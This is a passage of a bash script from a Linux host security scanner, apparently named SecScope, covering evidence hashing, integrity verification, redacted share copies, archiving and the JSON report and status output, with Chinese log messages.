    elif [ -n "$incomplete_suffix" ]; then
        printf '扫描不完整 - PARTIAL/INCONCLUSIVE，不能判定未发现威胁'
    else
        printf '未发现明显威胁指标'
    fi
}

secure_evidence_permissions() {
    [ -d "$OUTPUT_DIR" ] || return 1
    find "$OUTPUT_DIR" -type d -exec chmod 700 {} + 2>/dev/null || return 1
    find "$OUTPUT_DIR" -type f -exec chmod 600 {} + 2>/dev/null || return 1
}

generate_evidence_manifest() {
    local sha_file="${RAW_DIR}/manifest.sha256" json_file="${RAW_DIR}/manifest.json"
    local tmp_sha="${sha_file}.tmp.$$" tmp_json="${json_file}.tmp.$$"
    local file rel hash size first=true idx
    : > "$tmp_sha" || return 1
    {
        echo '{'
        printf '  "schema_version": 1, "run_id": %s, "hostname": %s, "collected_at": %s,\n' \
            "$(json_quote "$RUN_ID")" "$(json_quote "$HOSTNAME")" "$(json_quote "$RUN_FINISHED_AT")"
        printf '  "coverage_percent": %s, "modules": [\n' "$RUN_COVERAGE"
        for idx in "${!MODULE_IDS[@]}"; do
            [ "$idx" -gt 0 ] && printf ',\n'
            printf '    {"id":%s,"status":%s,"duration_seconds":%s,"detail":%s}' \
                "$(json_quote "${MODULE_IDS[$idx]}")" "$(json_quote "${MODULE_STATUSES[$idx]}")" \
                "${MODULE_DURATIONS[$idx]}" "$(json_quote "${MODULE_ERRORS[$idx]}")"
        done
        printf '\n  ], "files": [\n'
        while IFS= read -r file; do
            rel="${file#${RAW_DIR}/}"
            hash=$(sha256_file "$file") || return 1
            size=$(stat -c '%s' -- "$file" 2>/dev/null || stat -f '%z' -- "$file" 2>/dev/null || echo 0)
            printf '%s  %s\n' "$hash" "$rel" >> "$tmp_sha"
            [ "$first" = true ] || printf ',\n'
            first=false
            printf '    {"path":%s,"size_bytes":%s,"sha256":%s}' \
                "$(json_quote "$rel")" "$size" "$(json_quote "$hash")"
        done < <(find "$RAW_DIR" -type f ! -name 'manifest.sha256*' ! -name 'manifest.json*' -print | LC_ALL=C sort)
        printf '\n  ]\n}\n'
    } > "$tmp_json" || { rm -f "$tmp_sha" "$tmp_json"; return 1; }
    chmod 600 "$tmp_sha" "$tmp_json" || return 1
    mv "$tmp_sha" "$sha_file" && mv "$tmp_json" "$json_file"
}

write_integrity_verifier() {
    local verifier="${OUTPUT_DIR}/verify-report.sh"
    cat > "$verifier" <<'VERIFY'
#!/usr/bin/env bash
set -o pipefail
base_dir=$(cd "$(dirname "${BASH_SOURCE[0]}")" 2>/dev/null && pwd -P) || exit 1
failures=0
if command -v sha256sum >/dev/null 2>&1; then
    hash_file() { sha256sum "$1" | awk '{print $1}'; }
elif command -v shasum >/dev/null 2>&1; then
    hash_file() { shasum -a 256 "$1" | awk '{print $1}'; }
else
    echo "[FAIL] 缺少 sha256sum/shasum" >&2
    exit 1
fi

if [ ! -d "$base_dir/raw" ]; then
    echo "[FAIL] 缺少 raw/ 原始证据目录" >&2
    failures=$((failures + 1))
fi

full_manifest_verified=false
if command -v python3 >/dev/null 2>&1 && [ -f "$base_dir/report-manifest.json" ]; then
    if python3 - "$base_dir" <<'PY'
import fnmatch, hashlib, json, os, stat, sys
base = os.path.realpath(sys.argv[1])
with open(os.path.join(base, "report-manifest.json"), "r", encoding="utf-8") as fh:
    manifest = json.load(fh)
bad = 0
recorded = set()
for entry in manifest.get("files", []):
    rel = entry.get("path", "")
    path = os.path.realpath(os.path.join(base, rel))
    if not rel or path == base or not path.startswith(base + os.sep):
        print(f"[FAIL] 清单含不安全路径: {rel}")
        bad += 1
        continue
    if rel in recorded:
        print(f"[FAIL] 清单含重复路径: {rel}")
        bad += 1
        continue
    recorded.add(rel)
    if not os.path.isfile(path):
        print(f"[FAIL] 缺失: {rel}")
        bad += 1
        continue
    digest_obj = hashlib.sha256()
    with open(path, "rb") as fh:
        for chunk in iter(lambda: fh.read(1024 * 1024), b""):
            digest_obj.update(chunk)
    digest = digest_obj.hexdigest()
    if digest != entry.get("sha256") or os.path.getsize(path) != entry.get("size_bytes"):
        print(f"[FAIL] 大小或哈希不一致: {rel}")
        bad += 1

actual = set()
for root, dirs, files in os.walk(base, followlinks=False):
    dirs[:] = [name for name in dirs if not os.path.islink(os.path.join(root, name))]
    for name in files:
        path = os.path.join(root, name)
        try:
            if not stat.S_ISREG(os.lstat(path).st_mode):
                continue
        except OSError:
            continue
        rel = os.path.relpath(path, base).replace(os.sep, "/")
        if rel == "report-manifest.json" or rel == ".file_inventory.pending" or fnmatch.fnmatchcase(rel, "*.tmp.*"):
            continue
        actual.add(rel)
for rel in sorted(actual - recorded):
    print(f"[FAIL] 文件未纳入清单: {rel}")
    bad += 1
for rel in sorted(recorded - actual):
    print(f"[FAIL] 清单文件不属于当前证据包: {rel}")
    bad += 1
if bad:
    raise SystemExit(1)
print(f"[OK] report-manifest.json: {len(manifest.get('files', []))} 个文件")
PY
    then
        full_manifest_verified=true
    else
        failures=$((failures + 1))
    fi
else
    echo "[WARN] python3 或 report-manifest.json 不可用，仅校验基础 SHA-256 清单" >&2
fi

if [ "$full_manifest_verified" != true ]; then
    if [ -f "$base_dir/report.sha256" ]; then
        while read -r expected rel; do
            [ -n "$expected" ] && [ -n "$rel" ] || continue
            if [ ! -f "$base_dir/$rel" ] || [ "$(hash_file "$base_dir/$rel")" != "$expected" ]; then
                echo "[FAIL] HTML 哈希不一致或文件缺失: $rel" >&2
                failures=$((failures + 1))
            fi
        done < "$base_dir/report.sha256"
    else
        echo "[FAIL] 缺少 report.sha256" >&2
        failures=$((failures + 1))
    fi

    if [ -f "$base_dir/raw/manifest.sha256" ]; then
        while read -r expected rel; do
            [ -n "$expected" ] && [ -n "$rel" ] || continue
            if [ ! -f "$base_dir/raw/$rel" ] || [ "$(hash_file "$base_dir/raw/$rel")" != "$expected" ]; then
                echo "[FAIL] 原始证据哈希不一致或文件缺失: raw/$rel" >&2
                failures=$((failures + 1))
            fi
        done < "$base_dir/raw/manifest.sha256"
    else
        echo "[FAIL] 缺少 raw/manifest.sha256" >&2
        failures=$((failures + 1))
    fi
fi

[ "$failures" -eq 0 ] || exit 1
echo "[OK] 证据包完整性校验通过"
VERIFY
    chmod 600 "$verifier"
}

create_report_archive() {
    local parent base tmp_archive
    parent=$(dirname "$OUTPUT_DIR")
    base=$(basename "$OUTPUT_DIR")
    ARCHIVE_FILE="${OUTPUT_DIR}.tar.gz"
    [ ! -e "$ARCHIVE_FILE" ] || { log_error "归档文件已存在，拒绝覆盖: $ARCHIVE_FILE"; return 1; }
    tmp_archive="${ARCHIVE_FILE}.tmp.$$"
    if ! tar -czf "$tmp_archive" -C "$parent" "$base"; then
        rm -f "$tmp_archive"
        return 1
    fi
    chmod 600 "$tmp_archive" || { rm -f "$tmp_archive"; return 1; }
    mv "$tmp_archive" "$ARCHIVE_FILE"
    log_info "安全归档已生成: $ARCHIVE_FILE"
}

finalize_evidence() {
    secure_evidence_permissions || { log_error '无法收紧证据目录权限'; return 1; }
    generate_evidence_manifest || { log_error '证据完整性清单生成失败'; return 1; }
    write_raw_manifest || { log_error 'raw-manifest.json 生成失败'; return 1; }
    printf '%s  %s\n' "$(sha256_file "$HTML_FILE")" "$(basename "$HTML_FILE")" > "${OUTPUT_DIR}/report.sha256" || return 1
    chmod 600 "${OUTPUT_DIR}/report.sha256" || return 1
    write_integrity_verifier || { log_error '完整性校验脚本生成失败'; return 1; }
    write_report_manifest || { log_error 'report-manifest.json 生成失败'; return 1; }
    bash "${OUTPUT_DIR}/verify-report.sh" >/dev/null || { log_error '证据包完整性回归校验失败'; return 1; }
    secure_evidence_permissions || return 1
    [ "$CREATE_ARCHIVE" = false ] || create_report_archive || return 1
}

generate_report() {
    local verdict total raw_count
    verdict=$(verdict_text)
    total=$((SEVERITY_CRITICAL + SEVERITY_HIGH + SEVERITY_MEDIUM + SEVERITY_LOW))
    RUN_FINISHED_AT=$(date -u +%Y-%m-%dT%H:%M:%SZ)

    if ! command -v perl >/dev/null 2>&1; then
        log_error 'HTML 报告生成依赖 perl 不可用'
        return 1
    fi
    if ! generate_html_report "$verdict"; then
        log_error "HTML 报告生成失败: $HTML_FILE"
        rm -f "$HTML_FILE"
        return 1
    fi
    chmod 600 "$HTML_FILE" || return 1

    raw_count=$(find "$RAW_DIR" -type f 2>/dev/null | wc -l | tr -d ' ')
    echo
    log_info "检查完成: ${verdict}"
    log_info "发现 ${total} 项；变化 NEW=${LIFECYCLE_NEW} ESCALATED=${LIFECYCLE_ESCALATED} REOPENED=${LIFECYCLE_REOPENED} RESOLVED=${LIFECYCLE_RESOLVED}"
    log_info "覆盖率 ${RUN_COVERAGE}%；原始证据 ${raw_count} 个文件；HTML 报告: ${HTML_FILE}"
}

write_findings_json() {
    local file="${OUTPUT_DIR}/findings.json" pending="${OUTPUT_DIR}/.findings.json.pending.${BASHPID:-$$}" idx file_context
    {
        printf '{\n  "schema_version": 3, "report_version": %s, "platform":"linux", "profile":%s, "run_id": %s, "findings": [\n' "$(json_quote "$SCRIPT_VERSION")" "$(json_quote "$SCAN_PROFILE")" "$(json_quote "$RUN_ID")"
        for idx in "${!FINDINGS[@]}"; do
            [ "$idx" -gt 0 ] && printf ',\n'
            printf '    {"id":%s,"severity":%s,"finding_type":%s,"confidence":%s,"category":%s,"summary":%s,"evidence":%s,"recommendation":%s,"judgment_basis":%s,"escalation_conditions":%s,"evidence_domains":%s,"evidence_domain_count":%s,"counter_evidence":%s,"attack_timeline":%s,"rule_id":%s,"entity":%s,"entity_type":%s,"fingerprint":%s,"evidence_hash":%s,"module":%s,"mitre":%s,"lifecycle":%s,"first_seen":%s,"last_seen":%s,"occurrences":%s,"detector":"secscope-native","detector_version":%s,"event_ids":[],"entity_id":%s,"process_instance_id":%s,"evidence_sources":%s,"visibility_gaps":[],"deobfuscation_chain":[],"language":"","runtime":"","baseline_comparison":"","causal_edges":[],"raw_references":[' \
                "$(json_quote "${FINDINGS[$idx]}")" "$(json_quote "${FINDING_SEVS[$idx]}")" "$(json_quote "${FINDING_TYPES[$idx]}")" "$(json_quote "${FINDING_CONFIDENCES[$idx]}")" \
                "$(json_quote "${FINDING_CATS[$idx]}")" "$(json_quote "${FINDING_SUMMARIES[$idx]}")" "$(json_quote "$(redact_text "${FINDING_EVIDENCES[$idx]}")")" \
                "$(json_quote "${FINDING_RECOMMENDATIONS[$idx]}")" "$(json_quote "${FINDING_JUDGMENT_BASES[$idx]}")" "$(json_quote "${FINDING_ESCALATION_CONDITIONS[$idx]}")" \
                "$(csv_json_array "${FINDING_EVIDENCE_DOMAINS[$idx]}")" "${FINDING_DOMAIN_COUNTS[$idx]:-0}" "$(json_quote "${FINDING_COUNTER_EVIDENCE[$idx]}")" "$(lines_json_array "${FINDING_TIMELINES[$idx]}")" \
                "$(json_quote "${FINDING_RULE_IDS[$idx]}")" "$(json_quote "${FINDING_ENTITY_KEYS[$idx]}")" "$(json_quote "${FINDING_ENTITY_TYPES[$idx]:-GENERIC}")" "$(json_quote "${FINDING_FINGERPRINTS[$idx]}")" "$(json_quote "${FINDING_EVIDENCE_HASHES[$idx]}")" \
                "$(json_quote "${FINDING_MODULES[$idx]}")" "$(json_quote "${FINDING_MITRES[$idx]}")" "$(json_quote "${FINDING_LIFECYCLES[$idx]}")" "$(json_quote "${FINDING_FIRST_SEEN[$idx]}")" "$(json_quote "${FINDING_LAST_SEEN[$idx]}")" "${FINDING_OCCURRENCES[$idx]}" \
                "$(json_quote "$RULE_VERSION")" "$(json_quote "${FINDING_ENTITY_KEYS[$idx]}")" "$(json_quote "$([ "${FINDING_ENTITY_TYPES[$idx]:-GENERIC}" = PROCESS ] && printf '%s' "${FINDING_ENTITY_KEYS[$idx]}" || true)")" \
                "$(csv_json_array "${FINDING_RAW_REFS[$idx]}")"
            local ref ref_idx=0
            local -a refs=(); IFS=',' read -r -a refs <<< "${FINDING_RAW_REFS[$idx]}"
            for ref in "${refs[@]}"; do [ -n "$ref" ] || continue; [ "$ref_idx" -gt 0 ] && printf ','; printf '%s' "$(json_quote "$ref")"; ref_idx=$((ref_idx+1)); done
            printf ']}'
        done
        printf '\n  ],\n  "file_changes":['
        for idx in "${!FILE_BEHAVIOR_PATHS[@]}"; do
            [ "$idx" -gt 0 ] && printf ','
            file_context="${FILE_BEHAVIOR_CONTEXTS[$idx]}"
            printf '{"path":%s,"action":%s,"priority_score":%s,"priority_reasons":%s,"size_bytes":%s,"md5":%s,"sha256":%s,"process_context":%s,"network_context":%s,"reason":%s}' \
                "$(json_quote "${FILE_BEHAVIOR_PATHS[$idx]}")" "$(json_quote "${FILE_BEHAVIOR_ACTIONS[$idx]}")" "${FILE_BEHAVIOR_PRIORITY_SCORES[$idx]:-0}" "$(csv_json_array "${FILE_BEHAVIOR_PRIORITY_REASONS[$idx]}")" "${FILE_BEHAVIOR_SIZES[$idx]:-0}" "$(json_quote "${FILE_BEHAVIOR_MD5[$idx]}")" "$(json_quote "${FILE_BEHAVIOR_SHA256[$idx]}")" \
                "$(json_quote "$(context_field "$file_context" process)")" "$(json_quote "$(context_field "$file_context" network)")" "$(json_quote "${FILE_BEHAVIOR_REASONS[$idx]}")"
        done
        printf '],\n  "abnormal_connections":['
        for idx in "${!ABNORMAL_CONN_PIDS[@]}"; do
            [ "$idx" -gt 0 ] && printf ','
            printf '{"severity":%s,"pid":%s,"process_instance_id":%s,"exe":%s,"user":%s,"cmdline":%s,"ppid":%s,"systemd_service":%s,"target":%s,"is_new":%s,"package_owner":%s,"raw_evidence":%s}' \
                "$(json_quote "${ABNORMAL_CONN_SEVS[$idx]}")" "$(json_quote "${ABNORMAL_CONN_PIDS[$idx]}")" "$(json_quote "${ABNORMAL_CONN_INSTANCES[$idx]}")" "$(json_quote "${ABNORMAL_CONN_EXES[$idx]}")" "$(json_quote "${ABNORMAL_CONN_USERS[$idx]}")" "$(json_quote "${ABNORMAL_CONN_CMDS[$idx]}")" "$(json_quote "${ABNORMAL_CONN_PPIDS[$idx]}")" "$(json_quote "${ABNORMAL_CONN_SERVICES[$idx]}")" "$(json_quote "${ABNORMAL_CONN_TARGETS[$idx]}")" "$(json_quote "${ABNORMAL_CONN_NEW[$idx]}")" "$(json_quote "${ABNORMAL_CONN_PACKAGES[$idx]}")" "$(json_quote "${ABNORMAL_CONN_RAW[$idx]}")"
        done
        printf ']\n}\n'
    } > "$pending" || { rm -f -- "$pending"; return 1; }
    if ! validate_json_file "$pending"; then
        log_error "findings.json JSON 校验失败，拒绝提交报告"
        rm -f -- "$pending"
        return 1
    fi
    chmod 600 "$pending" && mv -f -- "$pending" "$file"
}

raw_status_for() {
    local wanted="$1" idx
    for idx in "${!RAW_PATHS[@]}"; do [ "${RAW_PATHS[$idx]}" = "$wanted" ] && { printf '%s\t%s\t%s' "${RAW_STATUSES[$idx]}" "${RAW_SOURCES[$idx]}" "${RAW_ERRORS[$idx]}"; return; }; done
    [ -s "${RAW_DIR}/${wanted}" ] && printf 'SUCCESS\tunknown\t' || printf 'NO_RESULTS\tunknown\t'
}

write_raw_manifest() {
    local file="${OUTPUT_DIR}/raw-manifest.json" raw rel hash size meta status source error first=true
    {
        printf '{\n  "schema_version": 3, "report_version": %s, "platform":"linux", "run_id": %s, "files": [\n' "$(json_quote "$SCRIPT_VERSION")" "$(json_quote "$RUN_ID")"
        while IFS= read -r raw; do
            rel="${raw#${RAW_DIR}/}"
            hash=$(awk -v rel="$rel" '$2==rel {print $1; exit}' "${RAW_DIR}/manifest.sha256" 2>/dev/null)
            [ -n "$hash" ] || hash=$(sha256_file "$raw" 2>/dev/null || true)
            size=$(stat -c '%s' -- "$raw" 2>/dev/null || stat -f '%z' -- "$raw" 2>/dev/null || echo 0)
            meta=$(raw_status_for "$rel"); IFS=$'\t' read -r status source error <<< "$meta"
            [ "$first" = true ] || printf ',\n'; first=false
            printf '    {"path":%s,"status":%s,"source":%s,"error_reason":%s,"size_bytes":%s,"sha256":%s}' \
                "$(json_quote "raw/${rel}")" "$(json_quote "$status")" "$(json_quote "$source")" "$(json_quote "$error")" "$size" "$(json_quote "$hash")"
        done < <(find "$RAW_DIR" -type f -print 2>/dev/null | LC_ALL=C sort)
        printf '\n  ]\n}\n'
    } > "$file" || return 1
    chmod 600 "$file"
}

write_report_manifest() {
    local file="${OUTPUT_DIR}/report-manifest.json" item rel hash size first=true raw_rel
    {
        printf '{\n  "schema_version": 3, "report_version": %s, "platform":"linux", "run_id": %s, "files": [\n' "$(json_quote "$SCRIPT_VERSION")" "$(json_quote "$RUN_ID")"
        while IFS= read -r item; do
            rel="${item#${OUTPUT_DIR}/}"
            case "$rel" in
                report-manifest.json|.file_inventory.pending|*.tmp.*) continue ;;
            esac
            hash=""
            case "$rel" in
                raw/*) raw_rel="${rel#raw/}"; hash=$(awk -v rel="$raw_rel" '$2==rel {print $1; exit}' "${RAW_DIR}/manifest.sha256" 2>/dev/null) ;;
                *) hash=$(awk -v rel="$rel" '$2==rel {print $1; exit}' "${OUTPUT_DIR}/report.sha256" 2>/dev/null) ;;
            esac
            [ -n "$hash" ] || hash=$(sha256_file "$item" 2>/dev/null || true)
            size=$(stat -c '%s' -- "$item" 2>/dev/null || stat -f '%z' -- "$item" 2>/dev/null || echo 0)
            [ "$first" = true ] || printf ',\n'; first=false
            printf '    {"path":%s,"size_bytes":%s,"sha256":%s}' "$(json_quote "$rel")" "$size" "$(json_quote "$hash")"
        done < <(find "$OUTPUT_DIR" -type f -print 2>/dev/null | LC_ALL=C sort)
        printf '\n  ]\n}\n'
    } > "$file" || return 1
    chmod 600 "$file"
}

create_share_package() {
    local share_dir="${OUTPUT_DIR}_share" file tmp original_output="$OUTPUT_DIR" original_raw="$RAW_DIR" original_html="$HTML_FILE"
    [ ! -e "$share_dir" ] || { log_error "分享副本已存在，拒绝覆盖: $share_dir"; return 1; }
    cp -R "$OUTPUT_DIR" "$share_dir" || return 1
    while IFS= read -r file; do
        [ "$(stat -c '%s' -- "$file" 2>/dev/null || stat -f '%z' -- "$file" 2>/dev/null || echo 0)" -le 10485760 ] || continue
        LC_ALL=C grep -Iq . "$file" 2>/dev/null || continue
        tmp="${file}.redacted.$$"
        perl -pe 's/((?<![A-Za-z0-9_])(?:password|passwd|token|secret|api[_-]?key|authorization|cookie|credential)\s*[=:]\s*)[^\s;,]+/${1}[REDACTED]/ig; s#(https?://)[^/@\s]+@#${1}[REDACTED]\@#ig; s/\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b/[IP-REDACTED]/g' "$file" > "$tmp" && mv "$tmp" "$file"
    done < <(find "$share_dir" -type f -print)
    printf '%s\n' '这是由 SecScope 生成的脱敏分享副本。自动脱敏不能保证覆盖所有业务敏感数据，传输前必须人工复核。此目录内完整性清单已针对脱敏后的文件重新生成。' > "${share_dir}/SHARE-NOTICE.txt"
    OUTPUT_DIR="$share_dir"; RAW_DIR="${share_dir}/raw"; HTML_FILE=$(find "$share_dir" -maxdepth 1 -type f -name 'report_*.html' -print -quit)
    generate_evidence_manifest || { OUTPUT_DIR="$original_output"; RAW_DIR="$original_raw"; HTML_FILE="$original_html"; return 1; }
    write_raw_manifest || { OUTPUT_DIR="$original_output"; RAW_DIR="$original_raw"; HTML_FILE="$original_html"; return 1; }
    [ -n "$HTML_FILE" ] && printf '%s  %s\n' "$(sha256_file "$HTML_FILE")" "$(basename "$HTML_FILE")" > "${share_dir}/report.sha256"
    write_report_manifest || { OUTPUT_DIR="$original_output"; RAW_DIR="$original_raw"; HTML_FILE="$original_html"; return 1; }
    bash "${share_dir}/verify-report.sh" >/dev/null || { OUTPUT_DIR="$original_output"; RAW_DIR="$original_raw"; HTML_FILE="$original_html"; return 1; }
    OUTPUT_DIR="$original_output"; RAW_DIR="$original_raw"; HTML_FILE="$original_html"
    find "$share_dir" -type d -exec chmod 700 {} +; find "$share_dir" -type f -exec chmod 600 {} +
    log_info "脱敏分享副本已生成（仍需人工复核）: $share_dir"
}

write_status_json() {
    local verdict="$1" idx file_context static_expected=0 static_scanned=0 static_skipped=0 static_errors=0 static_skip_reasons_json="[]" scan_completion_status=COMPLETE
    if [ -r "${RAW_DIR}/static-coverage.jsonl" ] && command -v python3 >/dev/null 2>&1; then
        IFS=$'\t' read -r static_expected static_scanned static_skipped static_errors static_skip_reasons_json < <(python3 - "${RAW_DIR}/static-coverage.jsonl" <<'PY'
import json, sys
rows=[]
for line in open(sys.argv[1], encoding='utf-8', errors='replace'):
    try: rows.append(json.loads(line))
    except ValueError: pass
summary=next((x for x in reversed(rows) if x.get('summary')), {})
expected=int(summary.get('expected_files', sum(int(x.get('expected_files',0) or 0) for x in rows if not x.get('summary'))) or 0)
scanned=int(summary.get('scanned_files', summary.get('selected',0)) or 0)
skipped=int(summary.get('skipped_files', max(0,expected-scanned)) or 0)
errors=int(summary.get('error_count', sum(int(x.get('error_count',x.get('errors',0)) or 0) for x in rows if not x.get('summary'))) or 0)
reasons=sorted(set(str(r) for x in rows for r in x.get('skip_reasons',[]) if r))
print('\t'.join((str(expected),str(scanned),str(skipped),str(errors),json.dumps(reasons,separators=(',',':')))))
PY
        )
    fi
    if [ "$static_errors" -gt 0 ] || [ "$static_skipped" -gt 0 ] || [ "$YARA_ERROR_COUNT" -gt 0 ] || [ "$YARA_TIMEOUT_COUNT" -gt 0 ]; then scan_completion_status=PARTIAL; fi
    if [ "$STATIC_CANDIDATE_STATUS" = PARTIAL ] && [ "$static_expected" -eq 0 ]; then scan_completion_status=INCONCLUSIVE; fi
    STATUS_FILE="${OUTPUT_DIR}/status.json"
    {
        echo '{'
        printf '  "schema_version": 3, "report_version": %s, "platform":"linux", "mode":%s, "profile":%s, "run_id": %s, "host_id": %s,\n' \
            "$(json_quote "$SCRIPT_VERSION")" "$(json_quote "$RUN_MODE")" "$(json_quote "$SCAN_PROFILE")" "$(json_quote "$RUN_ID")" "$(json_quote "$HOST_ID")"
        printf '  "hostname": %s, "started_at": %s, "finished_at": %s, "timezone":{"utc":"UTC","local_offset":%s},\n' \
            "$(json_quote "$HOSTNAME")" "$(json_quote "$RUN_STARTED_AT")" "$(json_quote "$RUN_FINISHED_AT")" "$(json_quote "$(date +%z 2>/dev/null || echo +0000)")"
        printf '  "verdict": %s, "coverage_percent": %s, "output": %s, "report_html": %s, "archive_index": %s,\n' \
            "$(json_quote "$verdict")" "$RUN_COVERAGE" "$(json_quote "$OUTPUT_DIR")" "$(json_quote "$HTML_FILE")" \
            "$(json_quote "${REPORT_ROOT}/index.html")"
        printf '  "native_scanner":{"mode":%s,"status":%s,"path":%s},\n' \
            "$(json_quote "$NATIVE_SCANNER_MODE")" "$(json_quote "$NATIVE_SCANNER_STATUS")" "$(json_quote "$NATIVE_SCANNER_PATH")"
        printf '  "scan_coverage":{"status":%s,"expected_files":%s,"scanned_files":%s,"skipped_files":%s,"error_count":%s,"skip_reasons":%s},\n' \
            "$(json_quote "$scan_completion_status")" "$static_expected" "$static_scanned" "$static_skipped" "$static_errors" "$static_skip_reasons_json"
        printf '  "corpus_validation":{"status":%s,"root":%s,"manifest":%s,"isolated":%s},\n' \
            "$(json_quote "$CORPUS_VALIDATION_STATUS")" "$(json_quote "$CORPUS_ROOT")" "$(json_quote "$CORPUS_MANIFEST_FILE")" \
            "$([ "$SCAN_PROFILE" = corpus-validation ] && printf true || printf false)"
        printf '  "native_runtime":{"ready":%s,"initial":%s,"periodic":%s,"final":%s,"raw":["raw/runtime-snapshot-initial.jsonl","raw/runtime-snapshot-periodic.jsonl","raw/runtime-snapshot-final.jsonl"]},\n' \
            "$NATIVE_RUNTIME_READY" "$(json_quote "$NATIVE_RUNTIME_INITIAL_STATUS")" "$(json_quote "$NATIVE_RUNTIME_PERIODIC_STATUS")" "$(json_quote "$NATIVE_RUNTIME_FINAL_STATUS")"
        printf '  "portable_paths":{"output":".","report_html":%s,"findings":"findings.json","raw":"raw/","raw_manifest":"raw-manifest.json","report_manifest":"report-manifest.json","archive_index":"../index.html"},\n' "$(json_quote "$(basename "$HTML_FILE")")"
        printf '  "local_addresses": ['
        for idx in "${!LOCAL_ADDRESSES[@]}"; do [ "$idx" -gt 0 ] && printf ','; printf '%s' "$(json_quote "${LOCAL_ADDRESSES[$idx]}")"; done
        printf '],\n'
        printf '  "severity": {"critical":%s,"high":%s,"medium":%s,"low":%s,"observe":%s},\n' \
            "$SEVERITY_CRITICAL" "$SEVERITY_HIGH" "$SEVERITY_MEDIUM" "$SEVERITY_LOW" "$SEVERITY_OBSERVE"
        printf '  "threat_severity": {"CRITICAL":%s,"HIGH":%s,"MEDIUM":%s,"LOW":%s},\n' \
            "$THREAT_CRITICAL" "$THREAT_HIGH" "$THREAT_MEDIUM" "$THREAT_LOW"
        printf '  "baseline_severity": {"CRITICAL":%s,"HIGH":%s,"MEDIUM":%s,"LOW":%s},\n' \
            "$BASELINE_CRITICAL" "$BASELINE_HIGH" "$BASELINE_MEDIUM" "$BASELINE_LOW"
        printf '  "anomaly_severity":{"CRITICAL":%s,"HIGH":%s,"MEDIUM":%s,"LOW":%s,"OBSERVE":%s},\n' "$ANOMALY_CRITICAL" "$ANOMALY_HIGH" "$ANOMALY_MEDIUM" "$ANOMALY_LOW" "$ANOMALY_OBSERVE"
        printf '  "software_trust_gap_severity":{"CRITICAL":%s,"HIGH":%s,"MEDIUM":%s,"LOW":%s,"OBSERVE":%s},\n' "$TRUST_CRITICAL" "$TRUST_HIGH" "$TRUST_MEDIUM" "$TRUST_LOW" "$TRUST_OBSERVE"
        printf '  "observation_severity":{"CRITICAL":%s,"HIGH":%s,"MEDIUM":%s,"LOW":%s,"OBSERVE":%s},\n' "$OBSERVATION_CRITICAL" "$OBSERVATION_HIGH" "$OBSERVATION_MEDIUM" "$OBSERVATION_LOW" "$OBSERVATION_OBSERVE"
        printf '  "threat_verdict":{"summary":%s,"severity":{"CRITICAL":%s,"HIGH":%s,"MEDIUM":%s,"LOW":%s}},\n' "$(json_quote "$(verdict_text)")" "$THREAT_CRITICAL" "$THREAT_HIGH" "$THREAT_MEDIUM" "$THREAT_LOW"
        printf '  "baseline_posture":{"summary":%s,"severity":{"CRITICAL":%s,"HIGH":%s,"MEDIUM":%s,"LOW":%s}},\n' "$(json_quote "$([ "$BASELINE_CRITICAL" -gt 0 ] && echo 严重 || { [ "$BASELINE_HIGH" -gt 0 ] && echo 高风险 || echo 需持续加固; })")" "$BASELINE_CRITICAL" "$BASELINE_HIGH" "$BASELINE_MEDIUM" "$BASELINE_LOW"
        printf '  "visibility_status":{"summary":%s,"module_coverage_percent":%s,"source_availability_percent":%s,"interpretation":"未发现仅表示在当前可见性和时间窗口内未形成规则证据，不代表确认安全。","file_monitor_status":%s,"patch_status":%s,"event_window_minutes":%s,"event_count":%s,"web_access_parsed":%s,"web_access_failed":%s,"sources":{"snapshot":%s,"auditd":%s,"falco":%s,"yara":%s,"ima":%s,"web_access":%s,"container":%s,"kubernetes":%s}},\n' \
            "$(json_quote "$TELEMETRY_EXPLANATION")" "$RUN_COVERAGE" "$SOURCE_AVAILABILITY_PERCENT" "$(json_quote "$FILE_SCAN_STATUS")" "$(json_quote "$PATCH_STATUS")" \
            "$EVENT_WINDOW_MINUTES" "$EVENT_COUNT" "$WEB_ACCESS_LOG_PARSED" "$WEB_ACCESS_LOG_FAILED" "$(json_quote "$EVENT_SOURCE_SNAPSHOT")" "$(json_quote "$EVENT_SOURCE_AUDITD")" "$(json_quote "$EVENT_SOURCE_FALCO")" "$(json_quote "$EVENT_SOURCE_YARA")" "$(json_quote "$EVENT_SOURCE_IMA")" "$(json_quote "$WEB_ACCESS_LOG_STATUS")" "$(json_quote "$CONTAINER_CONTEXT_STATUS")" "$(json_quote "$KUBERNETES_CONTEXT_STATUS")"
        printf '  "host_role":%s,"maintenance_active":%s,"source_availability_percent":%s,\n' "$(json_quote "$HOST_ROLE")" "$MAINTENANCE_ACTIVE" "$SOURCE_AVAILABILITY_PERCENT"
        printf '  "priority_count":%s,"state_health":%s,"auth_profile_health":%s,"finding_count":%s,"ioc_count":%s,\n' "${#PRIORITY_KEYS[@]}" "$(json_quote "$STATE_HEALTH")" "$(json_quote "$AUTH_PROFILE_HEALTH")" "${#FINDINGS[@]}" "${#IOCS[@]}"
        printf '  "patch_posture":{"status":%s,"latest_update":%s,"age_days":%s,"lifecycle_status":"需人工确认"},\n' "$(json_quote "$PATCH_STATUS")" "$(json_quote "$PATCH_LATEST")" "$PATCH_AGE_DAYS"
        printf '  "file_monitoring":{"mode":%s,"status":%s,"baseline":%s,"scanned_files":%s,"small_files_prioritized":%s,"added_small_files":%s,"skipped_files":%s,"hash_success":%s,"hash_computed":%s,"hash_reused":%s,"hash_failed":%s,"changes":%s,"suspicious_groups":%s,"observe_groups":%s,"config_status":%s,"config_warnings":%s,"limits":{"max_files":%s,"max_depth":%s,"max_hash_bytes":%s,"small_file_priority_bytes":%s,"timeout_seconds":%s},"priority_model":{"sort_order":["priority_score_desc","mtime_desc","size_asc","path_asc"],"weights":{"added_small":%s,"modified":%s,"runtime_exe":%s,"runtime_mapped":%s,"web_root":%s,"tmp_executable":%s,"persistence_path":%s,"recent":%s,"suspicious_extension":%s}}},\n' \
